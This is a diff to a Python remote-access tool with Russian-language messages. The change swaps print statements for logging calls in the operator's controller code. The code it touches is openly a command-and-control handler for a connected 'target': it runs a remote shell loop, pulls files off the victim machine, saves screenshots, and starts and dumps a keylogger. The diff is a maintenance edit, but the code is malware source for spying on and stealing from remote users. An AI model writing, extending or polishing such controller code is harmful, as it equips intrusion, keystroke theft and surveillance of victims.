@@ -50,7 +50,7 @@ def show_help():
     help                - Показать эту справку.
     """
 
-    print(help_text)
+    logging.info(help_text)
 
 
 def download_file(command, target):
@@ -58,15 +58,14 @@ def download_file(command, target):
     try:
         with open(file_name, "wb") as file:
             while True:
-                chunk = target.recv(1024)  
+                chunk = target.recv(1024)
                 if chunk.endswith(b"EOF"):  
                     file.write(chunk[:-3])  
                     break
                 file.write(chunk)  
-        print(f"[+] Файл {file_name} успешно загружен.")
+        logging.info(f"[+] Файл {file_name} успешно загружен и сохранен.")
     except Exception as e:
-        print(f"[!!] Ошибка при загрузке файла {file_name}: {e}")
-
+        logging.error(f"[!!] Ошибка при загрузке файла {file_name}: {e}")
 
 
 def upload_file(command, target):
@@ -122,7 +121,7 @@ def shell(target, ip):
                 break
             elif command.startswith("cd"):
                 response = reliable_recv(target)
-                print(response)
+                logging.info(response)
             elif command.startswith("download"):
                 download_file(command, target)
             elif command.startswith("upload"):
@@ -131,7 +130,7 @@ def shell(target, ip):
                 save_screenshot(target, screenshot_id)
                 screenshot_id += 1
             elif command == "keylog_start":
-                print(reliable_recv(target))
+                logging.info(reliable_recv(target))
             elif command == "keylog_dump":
                 try:
                     logs = reliable_recv(target)
@@ -140,7 +139,7 @@ def shell(target, ip):
                     logging.error(f"[!!] Ошибка при обработке команды keylog_dump: {e}")
             else:
                 response = reliable_recv(target)
-                print(response)
+                logging.info(response)
     except Exception as e:
         logging.error(f"[!!] Ошибка обработки клиента: {e}")
     finally:
